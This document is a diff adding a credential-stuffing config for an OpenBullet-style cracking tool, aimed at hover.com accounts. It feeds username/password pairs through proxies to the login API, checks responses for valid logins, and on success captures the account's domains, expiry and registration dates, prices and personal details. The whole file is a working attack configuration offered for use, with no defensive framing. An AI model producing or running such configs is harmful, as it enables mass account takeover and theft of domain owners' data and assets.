@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "HoverCom",
+  "SuggestedBots": 100,
+  "LastModified": "2018-09-28T00:25:31.4925043+00:00",
+  "AdditionalInfo": "SDS for idea thanks",
+  "Author": "TomKirkman",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.hover.com/signin" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(hover_session)>" LR "" "" Recursive=FALSE -> VAR "Session" "" "" 
+REQUEST POST "https://www.hover.com/signin/auth.json" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.hover.com" 
+  HEADER "Origin: https://www.hover.com" 
+  HEADER "Referer: https://www.hover.com/signin" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "succeeded\":true" 
+REQUEST GET "https://www.hover.com/control_panel/settings/receipts" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.hover.com/control_panel/domains" 
+  HEADER "Host: www.hover.com" 
+PARSE "<SOURCE>" LR "\":{\"domains\":[{\"id\":\"domain-" "\",\"" Recursive=TRUE -> CAP "Domains" "" "" 
+PARSE "<SOURCE>" LR "\",\"status\":\"" "\"," Recursive=FALSE -> CAP "Status" "" "" 
+PARSE "<SOURCE>" LR "\",\"expiry_date\":\"" "\"," Recursive=FALSE -> CAP "Exp. Date" "" "" 
+PARSE "<SOURCE>" LR "registration_date\":\"" "\"," Recursive=FALSE -> CAP "Reg Date" "" "" 
+PARSE "<SOURCE>" LR "\":{\"price\":\"" "\"," Recursive=FALSE -> CAP "Price of Domain" "" "" 
+PARSE "<SOURCE>" LR "\",\"fax\":\"\",\"first_" "\"}," Recursive=FALSE -> CAP "Random Info" "" "" 
